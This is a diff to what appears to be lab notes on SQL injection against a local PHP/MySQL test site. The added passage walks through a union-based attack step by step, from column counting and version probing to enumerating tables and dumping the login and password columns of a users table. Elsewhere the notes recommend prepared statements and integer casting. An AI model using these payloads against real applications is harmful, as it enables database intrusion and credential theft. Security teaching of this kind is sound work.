@@ -20,7 +20,14 @@ http://web.site/?search=1+order+by+1000
 error
 Unknown column '1000' in 'order clause'
 attack
-http://web.site/?search=1+union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.columns
+http://web.site/?search=1+union+select+0,concat_ws(0x3a,table_name,column_name)+from+information_schema.innodb_table_stats
+
+query = db.prepare("SELECT * FROM Books WHERE LOWER(title) LIKE ? OR LOWER(blurb) LIKE ?")
+
+pattern = "%" + input + "%"
+query.set_parameter(1, pattern)
+query.set_parameter(2, pattern)
+
 
 Simple table for helping testing
 
@@ -46,6 +53,34 @@ q' or 1=1; --
 q' or 1=1; #
 
 Search field
+SQL-injection via proc interface in mysqli
+What do you need in SQL-inj is pacience. And attacker will definatly have it.
+If i try to break srough
+v%' order by 10; -- 
+i cant see Error code but i can see another Error
+"Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean given in 
+C:\OpenServer\OSPanel\domains\sqlxss\index.php on line 76"
+it can be helpfull too for the attackers.
+SQL-I without error is
+v%' order by 4; -- -
+and now we can check it by... (for example)
+v%' and 1=0 union all select 1,2,3,4; -- -
+or
+v%' union all select 1,2,3,4; -- - (that`s a little bit shorter)
+next step
+v%' union all select 1,database(),version(),user(); -- -
+now we know name of the DB, version and Username
+v%' union all select 1,(select GROUP_CONCAT(TABLE_NAME) from information_schema.tables where table_schema=database()),version(),user(); -- -
+and after that we know names of the tables... what will be next ?
+direct sql as exaple "SELECT TABLE_NAME,COLUMN_NAME FROM `COLUMNS` WHERE TABLE_NAME='users' and TABLE_SCHEMA='test1'"
+now we will prepare "right" sql-i (for us)
+v%' union all select 1,table_name,column_name,4 FROM information_schema.columns WHERE TABLE_NAME='users' and TABLE_SCHEMA='test1'; -- -
+lets test...
+now we get names(that we need) of the columns user`s table
+id,login,pass,creation_time
+so, we need one more step...
+v%' union all select 1,login,pass,4 FROM users; -- -
+
 
 
 How to protect
@@ -57,7 +92,6 @@ check unstring types for example
 $q = "SELECT * FROM `tab` WHERE `id` = ".$_GET['user_id'];
 $q = "SELECT * FROM `tab` WHERE `id` = ".intval($_GET['user_id']);
 
-use Prepared Statements (PS)
-PS in signin.php is a good protection from SQL-Injections
+use Prepared Statements (PS) via MySQLi or PDO
 
-use PDO
+PS in signin.php is a good protection from SQL-Injections
